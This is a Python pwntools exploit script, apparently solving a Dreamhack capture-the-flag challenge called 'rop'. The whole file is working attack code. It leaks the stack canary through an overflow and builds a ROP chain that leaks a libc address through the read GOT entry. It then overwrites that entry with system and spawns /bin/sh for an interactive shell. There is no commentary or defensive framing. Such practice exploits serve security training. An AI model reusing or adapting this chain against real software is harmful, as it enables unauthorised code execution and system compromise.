from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./rop', env= {"LD_PRELOAD" : "./libc.so.6"})
#p = remote('host1.dreamhack.games', 17537)
e = ELF('./rop')
libc = ELF('./libc.so.6')
r = ROP(e)

context.arch = 'amd64'

payload = b'A'*0x39
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = r.find_gadget(['pop rdi'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15'])[0]
ret = r.find_gadget(['ret'])[0]

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
